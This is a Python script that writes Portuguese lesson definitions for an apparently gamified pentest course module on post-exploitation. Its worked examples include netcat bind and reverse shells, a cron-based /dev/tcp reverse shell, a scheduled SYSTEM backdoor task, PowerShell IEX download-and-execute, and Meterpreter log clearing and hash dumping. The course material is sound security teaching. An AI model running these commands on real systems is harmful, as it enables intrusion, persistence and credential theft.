# -*- coding: utf-8 -*-
import json
import os

# Caminho para o banco de dados de definições das lições
JSON_PATH = '/home/gabriel/Documentos/dev/cyberduo/scripts/lesson_definitions.json'

with open(JSON_PATH, 'r', encoding='utf-8') as f:
    lessons = json.load(f)

# Remover lições antigas do Módulo 8 para evitar duplicatas e conflitos de id/filename
lessons = [l for l in lessons if l['module'] != '8']

# Novas lições detalhadas e didáticas baseadas 100% no material Cisco
module_8_lessons = [
  {
    "filename": "8.0-introducao.html",
    "module": "8",
    "title": "Executando Técnicas de Pós-Exploração",
    "victory_msg": "PÓS-EXPLORAÇÃO INICIADA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-flag",
        "title": "Objetivos da Pós-Exploração (Cisco 8.0.1)",
        "content": "Em um teste de penetração, o objetivo final vai muito além de apenas encontrar vulnerabilidades. Após comprometer uma máquina alvo, a fase de <b>Pós-Exploração</b> serve para avaliar o risco de perdas potenciais que o cliente sofreria se um atacante real invadisse o sistema.<br><br>🛡️ Esta fase demonstra na prática até onde o invasor pode penetrar na rede interna e a quais dados confidenciais ele teria acesso total.",
        "highlight": "Na pós-exploração, você prova o impacto financeiro e operacional de uma invasão real!"
      },
      {
        "type": "teach",
        "icon": "fa-clock",
        "title": "Medindo o Tempo de Detecção (Cisco 8.0.1)",
        "content": "Outro objetivo crucial da pós-exploração é <b>avaliar a eficácia dos defensores</b> da organização (a equipe azul ou o SOC).<br><br>⏱️ Durante os testes, avalia-se quanto tempo a equipe de segurança leva para detectar as atividades suspeitas, identificar arquivos maliciosos e responder ao exploit. Isso ajuda a calibrar os sensores e alertas de intrusão do cliente.",
        "highlight": "Entrar sem ser detectado avalia a furtividade e a competência de monitoramento do SOC!"
      },
      {
        "type": "quiz",
        "task": "De acordo com as boas práticas da Cisco, qual é um objetivo essencial ao executar atividades de pós-exploração em um pentest?",
        "options": [
          "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
          "Causar danos físicos irreparáveis para forçar a empresa a comprar novos hardwares.",
          "Instalar softwares de mineração de bitcoin ocultos para financiar o projeto."
        ],
        "correctText": "Avaliar o tempo que leva o pessoal de segurança (SOC) para descobrir e responder ao exploit.",
        "explanation": "Testar a capacidade de resposta e detecção do SOC ajuda a calibrar sistemas de alarmes e otimizar processos de incidentes da empresa."
      },
      {
        "type": "fill",
        "sentence": "Após a invasão inicial, o testador executa atividades de pós-exploração para mover-se lateralmente e manter a ___ permanente no sistema comprometido.",
        "options": [
          "persistência",
          "criptografia",
          "desconexão"
        ],
        "correctText": "persistência",
        "explanation": "A persistência garante que o acesso seja mantido mesmo após reboots do servidor, permitindo demonstrar o impacto de longo prazo."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você compreendeu a base pedagógica e os objetivos reais de pós-exploração no pentest!"
  },
  {
    "filename": "8.1a-shells-c2.html",
    "module": "8",
    "title": "Canal de Acesso: Shells e Utilitários C2",
    "victory_msg": "CONEXÕES E C2 DOMINADOS!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-terminal",
        "title": "O que é um Shell? (Cisco 8.1.2)",
        "content": "Um <b>shell</b> é o software que serve de interface entre o usuário e o kernel do Sistema Operacional. No Linux, temos shells como <b>Bash, KSH e TCSH</b>. No Windows, o clássico é o CMD (`cmd.exe`) ou o moderno <b>PowerShell</b> (que combina scripts, cmdlets e administração avançada).<br><br>Durante um pentest, precisamos trazer essa linha de comando do alvo de volta ao nosso computador para gerenciar o sistema comprometido.",
        "highlight": "Shells permitem executar comandos diretamente no sistema operacional do alvo."
      },
      {
        "type": "teach",
        "icon": "fa-circle-dot",
        "title": "Bind Shell: Aguardando a Conexão (Cisco 8.1.2)",
        "content": "Em um <b>Bind Shell</b>, o atacante executa um backdoor na máquina da vítima que abre uma porta de rede e fica <b>escutando</b> (aguardando conexão). O atacante então inicia a conexão de fora e assume o controle.<br><br>⚠️ <b>Principal Desafio</b>: Se a vítima estiver atrás de um firewall ou NAT, a porta de escuta será bloqueada e o atacante não conseguirá se conectar.",
        "highlight": "Bind Shell = Vítima escuta a porta e o atacante se conecta."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Bind Shell com Netcat (Cisco 8.1.3)",
        "scenario": "Para criar um Bind Shell em um servidor Linux comprometido (192.168.78.6) usando a ferramenta Netcat, o pentester executa a escuta na porta 1234 direcionando para o Bash:",
        "code": "omar@jorel:~$ nc -lvp 1234 -e /bin/bash\nlistening on [any] 1234 ...",
        "takeaway": "No sistema do atacante, basta conectar no IP do alvo: 'nc -nv 192.168.78.6 1234' para ganhar o shell."
      },
      {
        "type": "teach",
        "icon": "fa-arrows-split-up-and-left",
        "title": "Reverse Shell: Burlado Firewalls (Cisco 8.1.2)",
        "content": "No <b>Reverse Shell (Shell Reverso)</b>, o processo é invertido: o <b>atacante</b> abre um ouvinte na sua própria máquina e a <b>vítima</b> inicia a conexão de dentro para fora, apontando para o IP do invasor.<br><br>🚀 <b>Grande Vantagem</b>: Como a conexão começa de dentro da rede corporativa para a internet, a maioria das políticas de firewall permite a saída, contornando proteções externas de entrada.",
        "highlight": "Reverse Shell = Atacante escuta a porta e a vítima se conecta de volta a ele."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Reverse Shell com Netcat (Cisco 8.1.3)",
        "scenario": "O atacante abre um listener em sua máquina (192.168.78.147) na porta 666 e força o servidor da vítima a se conectar de volta:",
        "code": "# 1. Na máquina do atacante:\n$ nc -lvp 666\n\n# 2. Na máquina da vítima:\n$ nc 192.168.78.147 666 -e /bin/bash",
        "takeaway": "A conexão de saída da vítima dá ao atacante controle imediato via terminal na porta 666."
      },
      {
        "type": "quiz",
        "task": "Por que o Shell Reverso (Reverse Shell) é muito mais eficaz do que o Bind Shell em cenários de pentests reais?",
        "options": [
          "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
          "Porque ele consome menos largura de banda e criptografa nativamente em AES-256.",
          "Porque ele não exige a instalação do utilitário Netcat ou do utilitário Bash."
        ],
        "correctText": "Porque ele inicia a conexão de dentro para fora da rede, contornando as restrições de firewall que barram conexões de entrada.",
        "explanation": "A maioria dos firewalls de borda bloqueia qualquer conexão vinda de fora (Bind), mas permite que servidores internos façam conexões para a internet (Reverso)."
      },
      {
        "type": "teach",
        "icon": "fa-terminal",
        "title": "O Payload Interativo Meterpreter (Cisco 8.1.4)",
        "content": "O <b>Meterpreter</b> é o payload dinâmico e interativo mais poderoso do framework Metasploit. Ao contrário de uma shell simples, ele permite executar tarefas complexas de pós-exploração via comandos nativos de forma limpa:<br><br>• <b>`lpwd`</b>: Exibe o diretório de trabalho local na própria máquina de ataque do pentester.<br>• <b>`clearev`</b>: Limpa os logs de aplicativo, sistema e segurança no host remoto para apagar vestígios.<br>• <b>`hashdump`</b>: Despeja as senhas criptografadas (hashes) salvas na base SAM do Windows.<br>• <b>`recurso`</b>: Executa sequencialmente uma lista de comandos Meterpreter previamente salvos em um arquivo de texto.",
        "highlight": "Meterpreter estende o acesso de uma shell comum e automatiza comandos de pós-exploração."
      },
      {
        "type": "match",
        "title": "Comandos Meterpreter (Cisco Tabela 8-3)",
        "pairs": [
          {
            "term": "lpwd",
            "definition": "Exibe o diretório local no sistema de ataque"
          },
          {
            "term": "clearev",
            "definition": "Limpa os logs de aplicativo, sistema e segurança"
          },
          {
            "term": "hashdump",
            "definition": "Extrai as senhas criptografadas do banco SAM (Windows)"
          },
          {
            "term": "recurso",
            "definition": "Executa comandos Meterpreter listados em arquivo de texto"
          }
        ]
      },
      {
        "type": "teach",
        "icon": "fa-server",
        "title": "Sistemas de Comando e Controle - C2 (Cisco 8.1.4)",
        "content": "Atacantes avançados utilizam estruturas de <b>Comando e Controle (C2)</b> para manter canais encobertos. A Cisco destaca ferramentas com técnicas específicas de evasão:<br><br>• <b>`DNSCat2`</b>: Cria conexões cifradas disfarçadas sob consultas de DNS, burlando firewalls padrão.<br>• <b>`TrevorC2`</b>: Emprega Python e esconde o tráfego simulando navegação web HTTP normal.<br>• <b>`WMImplant`</b>: Baseado em PowerShell, ele abusa da infraestrutura WMI legítima do Windows como canal de comando.<br>• <b>`Twittor`</b>: Utiliza as mensagens diretas de redes sociais para emitir comandos e burlar detecção de rede.",
        "highlight": "DNSCat2, TrevorC2, WMImplant e Twittor usam táticas diferentes para evadir detecção."
      },
      {
        "type": "match",
        "title": "Ferramentas e Utilitários C2 (Cisco 8.1.4)",
        "pairs": [
          {
            "term": "WMImplant",
            "definition": "Baseado em PowerShell, usa WMI como canal C2"
          },
          {
            "term": "DNSCat2",
            "definition": "Cria canais encobertos criptografados usando DNS"
          },
          {
            "term": "TrevorC2",
            "definition": "Evasivo baseado em Python, disfarça comandos como HTTP"
          },
          {
            "term": "Twittor",
            "definition": "Usa mensagens diretas de redes sociais para emitir comandos"
          }
        ]
      },
      {
        "type": "fill",
        "sentence": "No Netcat, também conhecido como a faca suíça do TCP/IP, o parâmetro ___ é usado para redirecionar e executar a shell após a conexão ser fechada.",
        "options": [
          "-e",
          "-l",
          "-p"
        ],
        "correctText": "-e",
        "explanation": "O parâmetro '-e' (exec) instrui o Netcat a redirecionar as entradas e saídas do executável (/bin/bash ou cmd.exe) diretamente para a conexão de rede."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você dominou o uso de Netcat, Meterpreter e compreendeu o funcionamento estratégico dos servidores C2!"
  },
  {
    "filename": "8.1b-persistencia-avancada.html",
    "module": "8",
    "title": "Persistência Avançada: Agendamentos, Serviços e Contas",
    "victory_msg": "PERSISTÊNCIA CONSOLIDADA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-clock",
        "title": "Agendador de Tarefas do Windows (Cisco 8.1.6)",
        "content": "No Windows, o Agendador de Tarefas (`taskschd.msc`) é uma mina de ouro para a persistência. Um invasor pode agendar tarefas para rodar no boot ou periodicamente.<br><br>⚙️ Se o atacante tiver acesso à GUI, ele pode usar tarefas agendadas para <b>burlar o UAC (Controle de Conta de Usuário)</b>, pois tarefas podem ser configuradas para rodar com os privilégios máximos do sistema (SYSTEM) sem solicitar credenciais administrativas.",
        "highlight": "Tarefas agendadas rodam de forma invisível e persistente em privilégio SYSTEM."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Criando Tarefa Agendada no Windows",
        "scenario": "Para evitar alarmes, o pentester agenda a execução de um backdoor compactado para rodar nos fins de semana à noite (quando não há monitoramento ativo e a rede está ociosa):",
        "code": "> schtasks /create /tn \"SystemMaintenance\" /tr \"c:\\temp\\backdoor.exe\" /sc weekly /d SAT /st 23:00 /ru \"SYSTEM\"",
        "takeaway": "O utilitário schtasks configura persistência nativa e com privilégio máximo de forma imperceptível."
      },
      {
        "type": "teach",
        "icon": "fa-repeat",
        "title": "Daemons Customizados e Cron Jobs no Linux (Cisco 8.1.7)",
        "content": "No Linux, a forma mais garantida de sobrevivência a reinicializações é criar <b>daemons/serviços customizados</b> iniciados na inicialização do boot ou configurar agendamentos na <b>Crontab (Cron Jobs)</b>.<br><br>Esses scripts garantem a execução regular do payload e restabelecem a conexão se ela cair.",
        "highlight": "Daemons e crontabs executam comandos silenciosos de volta para a máquina do atacante."
      },
      {
        "type": "example",
        "icon": "fa-code",
        "title": "Prática - Cron Job de Persistência no Linux",
        "scenario": "O invasor insere uma linha no crontab do Linux para executar uma tentativa de shell reverso secreta a cada 5 minutos:",
        "code": "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.78.147/4444 0>&1'",
        "takeaway": "A cada 5 minutos, a vítima tentará silenciosamente nos dar acesso root de volta."
      },
      {
        "type": "quiz",
        "task": "Por que a criação de tarefas agendadas administrativas (via 'schtasks') com privilégios de SYSTEM permite contornar proteções interativas de controle de conta (UAC)?",
        "options": [
          "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
          "Porque o UAC só funciona em navegadores de internet e não monitora o prompt de comando.",
          "Porque as tarefas agendadas administrativas removem fisicamente o antivírus da máquina da vítima."
        ],
        "correctText": "Porque as tarefas agendadas administrativas rodam em privilégio de sistema máximo do kernel sem exigir validação ou interação humana.",
        "explanation": "O agendador de tarefas executa processos administrativos no background de forma nativa e não interativa, o que burla as caixas de alerta do UAC."
      },
      {
        "type": "fill",
        "sentence": "Para configurar persistência nativa a cada poucos minutos no Linux, editamos os agendamentos salvos no utilitário de tabela do sistema operacional chamado ___.",
        "options": [
          "crontab",
          "systemctl",
          "passwd"
        ],
        "correctText": "crontab",
        "explanation": "A tabela do daemon Cron (crontab) executa tarefas agendadas de background de forma regular."
      },
      {
        "type": "teach",
        "icon": "fa-user-plus",
        "title": "Novo Usuário Administrador (Cisco 8.1.8)",
        "content": "Se o testador de penetração obteve privilégios de <b>Administrador (Windows) ou Root (Linux)</b>, ele pode consolidar seu acesso criando contas alternativas e adicionais de usuários na máquina.<br><br>🔐 <b>Boas Práticas de Ataque</b>: Crie contas alternativas usando <b>senhas complexas e robustas</b> para evitar que atacantes rivais façam brute force em sua porta dos fundos ou que os administradores descubram acessos fracos.",
        "highlight": "Novas contas de usuário fornecem persistência legítima via protocolos de RDP ou SSH."
      },
      {
        "type": "quiz",
        "task": "Ao criar contas alternativas de administrador para manter a persistência após comprometer um sistema, qual recomendação deve ser seguida?",
        "options": [
          "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
          "Utilizar senhas vazias ou 'admin123' para facilitar acessos rápidos de qualquer local.",
          "Não configurar senhas, já que o sistema automaticamente desativa a autenticação para testadores."
        ],
        "correctText": "Utilizar senhas altamente complexas para evitar o sequestro do acesso por outros agentes de ameaça.",
        "explanation": "Senhas fracas deixadas por pentesters representam um risco gigantesco de intrusão real por cibercriminosos (que varrem a rede constantemente)."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você compreendeu a fundo os mecanismos de persistência no Windows e Linux, garantindo o acesso simulado a longo prazo!"
  },
  {
    "filename": "8.2a-movimento-lateral.html",
    "module": "8",
    "title": "Movimento Lateral e Living off the Land",
    "victory_msg": "PIVOTAGEM E LOLBINS DOMINADOS!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-arrows-left-right",
        "title": "O que é Movimento Lateral? (Cisco 8.2.1)",
        "content": "O <b>Movimento Lateral</b> (também chamado de <b>Pivotagem / Pivoting</b>) é o ato de usar o primeiro sistema comprometido como um trampolim para atacar outras máquinas na rede interna corporativa.<br><br>O objetivo principal é evitar a detecção, mapear o ambiente e obter acesso a <b>dados confidenciais</b>. O processo de transferir esses dados do interior para fora do perímetro da organização de forma oculta é a <b>Exfiltração de Dados</b>.",
        "highlight": "A primeira máquina invadida raramente é o alvo final. Ela serve para pivotar até o objetivo."
      },
      {
        "type": "teach",
        "icon": "fa-network-wired",
        "title": "Estratégia de Segmentação de Rede (Cisco 8.2.2)",
        "content": "O movimento lateral só é possível se o cliente não possuir uma estratégia adequada de <b>Segmentação de Rede</b>.<br><br>🛡️ Para proteger a organização, utilizam-se firewalls internos, VLANs (redes locais virtuais) ou microsegmentação em ambientes virtualizados e containerizados. Testar a eficácia dessa segmentação de rede de forma frequente é vital no pentest.",
        "highlight": "VLANs e firewalls internos bem configurados restringem a movimentação lateral do atacante."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Habilitando RDP via Metasploit (Cisco 8.2.2)",
        "scenario": "Para obter controle visual do sistema Windows invadido a partir do Meterpreter, o testador utiliza o módulo de pós-exploração para ativar o serviço de RDP (Remote Desktop) e configurar permissões de firewall:",
        "code": "meterpreter > run post/windows/manage/enable_rdp\n[*] Enabling Remote Desktop Service...\n[*] Opening RDP Port in Windows Firewall...\n[+] Service enabled successfully!",
        "takeaway": "O RDP oferece uma interface gráfica completa criptografada, o que oculta o que você faz dos sensores de tráfego de rede."
      },
      {
        "type": "quiz",
        "task": "Qual é a principal desvantagem ou risco de se utilizar conexões de Área de Trabalho Remota (RDP) para se mover lateralmente durante um engajamento?",
        "options": [
          "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
          "As conexões RDP não oferecem interface gráfica (GUI), limitando as ações a comandos CMD brutos.",
          "O tráfego de rede RDP não aceita criptografia, permitindo que firewalls descobram senhas na rede facilmente."
        ],
        "correctText": "O usuário legítimo que está operando o computador remotamente pode notar de forma interativa a intrusão ou o logon de outra conta.",
        "explanation": "No Windows clássico de desktop, conectar via RDP derruba a sessão do usuário ativo ou exige autorização visual dele, expondo o atacante na hora."
      },
      {
        "type": "teach",
        "icon": "fa-ghost",
        "title": "Living off the Land e Malware Sem Arquivo (Cisco 8.2.3)",
        "content": "Instalar binários maliciosos ou vírus no disco da vítima é barulhento e facilmente bloqueado pelo antivírus. Os atacantes preferem o <b>Living-off-the-Land (LOLBins)</b>.<br><br>Essa técnica (frequentemente chamada de <b>malware sem arquivo / fileless</b>) usa utilitários e comandos legítimos e nativos do próprio sistema operacional (como PowerShell, WMI, WinRM e PsExec) para executar tarefas maliciosas.",
        "highlight": "LOLBins usam a própria 'lei' do sistema contra ele, agindo na memória sem salvar arquivos em disco!"
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Execução In-Memory com PowerShell (Cisco 8.2.3)",
        "scenario": "Para executar um script de backdoor sem baixar nenhum executável ou arquivo no HD da vítima, o atacante usa a diretiva IEX para baixar e rodar o script diretamente na memória RAM:",
        "code": "PS > IEX (New-Object Net.WebClient).DownloadString('http://10.1.2.3/Invoke-PowerShellTcp.ps1')",
        "takeaway": "Como o arquivo PS1 roda direto na memória RAM, a análise de disco estática do antivírus não detecta a execução."
      },
      {
        "type": "quiz",
        "task": "Qual é a principal característica que define a técnica de Living-off-the-Land (LOLBins) em um ataque cibernético ou simulação?",
        "options": [
          "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
          "A necessidade de formatar fisicamente o disco rígido do servidor comprometido.",
          "O desenvolvimento de malwares binários extremamente pesados codificados em C++."
        ],
        "correctText": "O uso exclusivo de utilitários legítimos e comandos nativos já existentes no próprio sistema alvo.",
        "explanation": "LOLBins evitam alertas do antivírus porque não introduzem novos arquivos executáveis estranhos; eles usam os binários confiáveis do próprio sistema (ex: PowerShell, WMI) para rodar o ataque."
      },
      {
        "type": "fill",
        "sentence": "Para forçar o download e a execução de um script diretamente na memória RAM da vítima sem salvar o arquivo no HD, os invasores utilizam o cmdlet de execução de expressões com a sigla ___.",
        "options": [
          "IEX",
          "LS",
          "CD"
        ],
        "correctText": "IEX",
        "explanation": "IEX (Invoke-Expression) é comumente combinado com Net.WebClient.DownloadString para carregar e rodar códigos refletivamente na RAM."
      }
    ],
    "victory_title": "Excelente!",
    "victory_msg": "Você dominou os fundamentos de pivotagem, segmentação de rede e o conceito tático de Living off the Land (LOLBins)!"
  },
  {
    "filename": "8.2b-powershell-sysinternals.html",
    "module": "8",
    "title": "Ferramentas Nativas: PowerShell e Sysinternals",
    "victory_msg": "POWERSHELL E SYSINTERNALS DOMINADOS!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-terminal",
        "title": "Comandos PowerShell na Pós-Exploração (Cisco Tabela 8-4)",
        "content": "No Windows, o <b>PowerShell</b> oferece recursos avançados para pós-exploração que vão muito além de listar arquivos. A Cisco destaca quatro comandos e cmdlets altamente práticos nesse estágio:<br><br>• <b>`Select-String`</b>: Funciona de forma similar ao `grep` do Linux. É excelente para vasculhar pastas de usuários ou backups buscando arquivos contendo termos como 'password' ou 'senha'.<br>• <b>`Get-HotFix`</b>: Retorna uma lista completa de correções e atualizações de segurança instaladas no S.O., ajudando o atacante a identificar falhas de kernel não corrigidas.<br>• <b>`Get-Process`</b>: Lista todos os processos ativos em execução no computador, permitindo auditar a presença de agentes de segurança (EDRs, Antivírus) ou sistemas críticos.<br>• <b>`DownloadFile`</b>: Um método da classe `Net.WebClient` usado para baixar binários adicionais da web via HTTP, funcionando como o utilitário `wget` do Linux.",
        "highlight": "Esses comandos nativos fornecem informações riquíssimas sem levantar os alarmes normais de arquivos maliciosos."
      },
      {
        "type": "example",
        "icon": "fa-code",
        "title": "Prática - Executando Cmdlets PowerShell na Pós-Exploração",
        "scenario": "Para localizar senhas em arquivos de texto no diretório de usuários ou baixar uma ferramenta utilitária como o netcat sem usar o navegador, o testador roda:",
        "code": "# 1. Buscando a palavra 'password' em arquivos TXT de usuários:\nPS > Select-String -path c:\\users\\*.txt -pattern password\n\n# 2. Baixando a ferramenta netcat do servidor do atacante:\nPS > (New-Object System.Net.WebClient).DownloadFile('http://10.1.2.3/nc.exe', 'nc.exe')\n\n# 3. Verificando as correções e atualizações de segurança instaladas:\nPS > Get-HotFix",
        "takeaway": "Com esses três comandos nativos, você localiza senhas, audita falhas e puxa payloads adicionais de forma ágil."
      },
      {
        "type": "match",
        "title": "Comandos PowerShell na Pós-Exploração (Cisco Tabela 8-4)",
        "pairs": [
          {
            "term": "Select-String",
            "definition": "Localiza textos (como senhas) dentro de arquivos de diretórios"
          },
          {
            "term": "Get-HotFix",
            "definition": "Obtém a listagem completa de correções e patches do S.O."
          },
          {
            "term": "Get-Process",
            "definition": "Lista todos os processos ativos em execução no sistema"
          },
          {
            "term": "DownloadFile",
            "definition": "Busca e baixa arquivos via HTTP similar ao utilitário wget do Linux"
          }
        ]
      },
      {
        "type": "quiz",
        "task": "Suponha que você comprometeu um host Windows e precisa buscar credenciais vazadas em arquivos locais de backup. Qual cmdlet PowerShell nativo é o mais adequado e eficiente para buscar o padrão 'senha' ou 'password' em múltiplos arquivos?",
        "options": [
          "Select-String",
          "Get-HotFix",
          "Get-Process"
        ],
        "correctText": "Select-String",
        "explanation": "Select-String busca por padrões de texto (incluindo expressões regulares) dentro de arquivos, atuando de forma análoga ao comando grep do Linux."
      },
      {
        "type": "teach",
        "icon": "fa-toolbox",
        "title": "Conjunto de Ferramentas Sysinternals (Cisco 8.2.3)",
        "content": "A suíte <b>Sysinternals</b> da Microsoft é uma coleção de utilitários legítimos projetada para gerenciamento do sistema. Em pós-exploração, ela é valiosa por ser operada totalmente via linha de comando e interagir de forma robusta com o sistema remoto:<br><br>• <b>`PsExec`</b>: Permite executar processos remotamente de forma nativa. O atacante pode usá-lo para rodar scripts ou cmd.exe na máquina da vítima, com a vantagem de que a saída do comando é redirecionada direto para o terminal do atacante.<br>• <b>`PsGetSid`</b>: Exibe o Identificador de Segurança (SID) de usuários locais e de domínio, vital para ataques de elevação de privilégios ou persistência.<br>• <b>`PsLoggedOn`</b>: Exibe uma lista em tempo real de todas as contas de usuários atualmente ativas e logadas no host alvo.<br>• <b>`PsFile`</b>: Mostra quais arquivos do sistema estão atualmente abertos e sendo compartilhados na rede.",
        "highlight": "Ferramentas Sysinternals rodam de forma limpa e são assinadas pela própria Microsoft, o que dificulta o bloqueio simples por antivírus."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Sysinternals em Ação com PsExec (Cisco 8.2.3)",
        "scenario": "Para rodar comandos de prompt silenciosamente no alvo (10.1.2.3) e ver os resultados em sua própria tela, o pentester executa o utilitário PsExec fornecendo credenciais de rede:",
        "code": "C:\\> psexec \\\\10.1.2.3 -u Administrator -p P@ssw0rd1 cmd.exe\n\nConnecting to 10.1.2.3...\nStarting PsExec service on 10.1.2.3...\n\nMicrosoft Windows [Version 10.0.19044]\nC:\\Windows\\system32>",
        "takeaway": "O PsExec instala temporariamente um pequeno serviço no alvo, executa o comando e depois o desinstala de forma higiênica."
      },
      {
        "type": "match",
        "title": "Conjunto de Ferramentas Sysinternals (Cisco 8.2.3)",
        "pairs": [
          {
            "term": "PsExec",
            "definition": "Executa remotamente e exibe as saídas de comandos no terminal local"
          },
          {
            "term": "PsGetSid",
            "definition": "Exibe os identificadores de segurança (SIDs) dos usuários"
          },
          {
            "term": "PsLoggedOn",
            "definition": "Lista contas de usuários conectadas ativamente no host"
          },
          {
            "term": "PsFile",
            "definition": "Exibe a lista de arquivos abertos e compartilhados do sistema"
          }
        ]
      },
      {
        "type": "fill",
        "sentence": "Para habilitar o gerenciamento remoto nativo (PS remoting / WinRM) do Windows e abrir o firewall para receber conexões de outros sistemas na rede, rodamos Enable-___. (-SkipNetworkProfileCheck -Force)",
        "options": [
          "PSRemoting",
          "Process",
          "Service"
        ],
        "correctText": "PSRemoting",
        "explanation": "O cmdlet Enable-PSRemoting configura o WinRM para aceitar conexões administrativas remotas via PowerShell."
      }
    ],
    "victory_title": "Parabéns!",
    "victory_msg": "Você dominou o uso prático de cmdlets PowerShell ofensivos e a poderosa suíte Sysinternals da Microsoft!"
  },
  {
    "filename": "8.2c-escalada-limpeza.html",
    "module": "8",
    "title": "Elevação de Acesso, Higienização e Evasão Esteganográfica",
    "victory_msg": "MÓDULO 8 CONCLUÍDO COM MAESTRIA!",
    "steps": [
      {
        "type": "teach",
        "icon": "fa-sitemap",
        "title": "Mapeando o Domínio: PowerSploit, Empire e BloodHound (Cisco 8.2.3)",
        "content": "A pós-exploração em redes corporativas com Active Directory (AD) utiliza ferramentas sofisticadas de automação:<br><br>• <b>`BloodHound`</b>: É uma aplicação web de página única (Javascript) que utiliza <b>Teoria dos Grafos</b> para mapear visualmente todas as relações complexas no Active Directory (usuários, grupos, computadores, permissões). Ele revela caminhos ocultos de ataque, mostrando exatamente qual sequência de computadores e contas um invasor deve comprometer para se tornar Administrador de Domínio.<br>• <b>`Empire`</b>: Um framework de comando e controle (C2) open source extremamente modular que permite gerenciar agentes PowerShell e Python. Ele executa payloads pós-exploração diretamente na memória RAM, sem a necessidade de chamar o binário `powershell.exe`, o que burla muitos mechanisms de monitoramento.<br>• <b>`PowerSploit`</b>: Uma coleção clássica de scripts ofensivos que facilitam tarefas como carregar o Mimikatz diretamente na memória RAM (`Invoke-Mimikatz`) para despejar senhas salvas, ou ler arquivos brutos particionados em NTFS (`Invoke-NinjaCopy`).",
        "highlight": "Essas ferramentas mapeiam e automatizam a exploração de domínios corporativos inteiros de forma extremamente avançada."
      },
      {
        "type": "quiz",
        "task": "Qual é a principal inovação metodológica trazida pelo utilitário BloodHound para o mapeamento e a exploração de redes baseadas em Microsoft Active Directory?",
        "options": [
          "O uso da Teoria dos Grafos para revelar caminhos ocultos de ataque a partir de relações de permissão entre usuários, grupos e computadores.",
          "A criação de firewalls virtuais de microsegmentação automatizados na infraestrutura do cliente.",
          "A quebra por força bruta ultrarrápida de hashes NTLMv2 capturados no tráfego SMB."
        ],
        "correctText": "O uso da Teoria dos Grafos para revelar caminhos ocultos de ataque a partir de relações de permissão entre usuários, grupos e computadores.",
        "explanation": "Ao mapear permissões como nós e arestas de um grafo, o BloodHound expõe graficamente caminhos de escalada complexos de 'Usuário Comum' até 'Domain Admin'."
      },
      {
        "type": "teach",
        "icon": "fa-angles-up",
        "title": "Escalada de Privilégios (Cisco 8.2.5)",
        "content": "A escalada de privilégios consiste em explorar brechas em serviços locais, kernel ou configurações incorretas para obter mais permissões do que a conta inicial possuía. Ela é dividida em dois eixos:<br><br>↕️ <b>Escalada Vertical</b>: Ocorre quando um usuário de baixo nível obtém acesso a uma conta com poderes administrativos superiores (ex: o usuário comum vira `root` no Linux ou `SYSTEM`/`Administrator` no Windows).<br><br>↔️ <b>Escalada Horizontal</b>: Ocorre quando um usuário acessa recursos ou executa funções pertencentes a outros usuários que possuem o <b>mesmo nível de privilégio</b> hierárquico (ex: acessar a fatura privada de outro cliente ou ler mensagens pessoais de outra conta comum).",
        "highlight": "A escalada demonstra se um atacante pode tomar controle integral do sistema operacional ou violar a privacidade dos usuários."
      },
      {
        "type": "quiz",
        "task": "Durante um teste web em um e-commerce, você percebe que ao visualizar o seu perfil de usuário comum, a URL exibe 'perfil?usuario_id=9870'. Se você alterar o ID manualmente para '9871' e conseguir visualizar e editar todas as informações privadas e endereços de outro cliente comum, que tipo de escalada de privilégios ocorreu?",
        "options": [
          "Escalada de privilégios horizontal (abuso de autorização lateral entre mesmos níveis de privilégio).",
          "Escalada de privilégios vertical (obtenção direta de acesso administrative SYSTEM).",
          "Ataque de negação de serviço distribuído (DDoS) para derrubar o servidor."
        ],
        "correctText": "Escalada de privilégios horizontal (abuso de autorização lateral entre mesmos níveis de privilégio).",
        "explanation": "Você não virou administrador geral do sistema, mas conseguiu invadir e modificar o espaço de dados de outro usuário com o mesmo nível de permissão (falha conhecida como IDOR/BOLA)."
      },
      {
        "type": "teach",
        "icon": "fa-file-image",
        "title": "Esteganografia com a ferramenta Steghide (Cisco 8.2.7)",
        "content": "A <b>Esteganografia</b> é a arte e ciência de ocultar a própria existência de uma mensagem secreta dentro de outra mídia inocente, como arquivos de imagem (`.jpg`, `.bmp`) ou áudio (`.wav`).<br><br>🔒 <b>Uso Prático</b>: Em testes de segurança, é empregada para demonstrar como invasores podem realizar a <b>Exfiltração de Dados</b> confidenciais de forma silenciosa, burlando detectores automáticos de DLP (Data Loss Prevention) instalados na rede do cliente.<br><br>No Kali Linux, a ferramenta clássica para embutir e extrair payloads de forma simples e criptografada é o <b>`steghide`</b>.",
        "highlight": "Esteganografia esconde a própria existência da informação secreta dentro de outra mídia."
      },
      {
        "type": "example",
        "icon": "fa-terminal",
        "title": "Prática - Ocultando e Extraindo com Steghide (Cisco 8.2.8)",
        "scenario": "Para ocultar um arquivo confidencial contendo senhas vazadas ('segredo.txt') dentro de uma imagem de cobertura de férias ('foto.jpg'), e depois recuperá-lo no host do atacante, executa-se:",
